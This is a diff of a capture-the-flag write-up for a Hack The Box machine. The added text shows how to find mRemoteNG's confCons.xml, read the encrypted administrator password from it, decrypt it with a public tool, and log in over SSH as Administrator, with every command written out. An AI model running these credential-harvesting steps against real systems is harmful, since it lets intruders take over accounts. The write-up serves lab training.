@@ -235,11 +235,69 @@ I found a remote connection management tool that stores user encrypted passwords
 
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a69f5922-2b19-4659-a8e0-f74da4b6ac22)
 
-Well, doing some research about this I found this [blog](https://vk9-sec.com/exploiting-mremoteng/).
+Well, doing some research about this I found this
 
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4f147957-4129-4af3-bdeb-4bbeb838db76)
 
-We got the name of the file where the passwords are stored at
+We got the name of the file where the passwords are stored at. Running a quick directory search command ```dir /s /b confCons.xml```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/467c8e3b-dea5-4aa1-950f-733c3ed75661)
+
+Cool, we got the full path already. To view the contents of the file
+
+command:```type C:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/d8b7657c-703e-45a8-81c5-19962dcd8d40)
+
+We got the encrypted password for the administrator user hehe. Lets crack it.
+
+We can use the ```mRemoteNG-Decrypt``` tool for this. You can get this from this [repo](https://github.com/haseebT/mRemoteNG-Decrypt)
+
+```
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/bastion]
+└─$ git clone https://github.com/haseebT/mRemoteNG-Decrypt.git                        
+Cloning into 'mRemoteNG-Decrypt'...
+remote: Enumerating objects: 19, done.
+remote: Total 19 (delta 0), reused 0 (delta 0), pack-reused 19
+Receiving objects: 100% (19/19), 14.80 KiB | 105.00 KiB/s, done.
+Resolving deltas: 100% (4/4), done.
+                                                                                                                                                                                                
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/bastion]
+└─$ cd mRemoteNG-Decrypt                    
+                                                                                                                                                                                                
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/bastion/mRemoteNG-Decrypt]
+└─$ ls
+LICENSE  mremoteng_decrypt.py  README.md
+                                                                                                                                                                                                
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/bastion/mRemoteNG-Decrypt]
+└─$ python mremoteng_decrypt.py 
+usage: mremoteng_decrypt.py [-h] [-f FILE | -s STRING] [-p PASSWORD]
+
+Decrypt mRemoteNG passwords.
+
+options:
+  -h, --help            show this help message and exit
+  -f FILE, --file FILE  name of file containing mRemoteNG password
+  -s STRING, --string STRING
+                        base64 string of mRemoteNG password
+  -p PASSWORD, --password PASSWORD
+                        Custom password
+```
+To crack the  password
+
+command:```python mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f3f3c037-9604-4996-8c9b-2c101e97f5d6)
+
+We were able to successfully crack the password hehe. Now we can ssh into the server as the administrator user
+
+command:```ssh Administrator@10.129.76.187```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/7881c693-e3c3-4d2b-a6b6-dc00fd81c580)
+
+Box Pwned Successfully😎
+
+
 
 
 
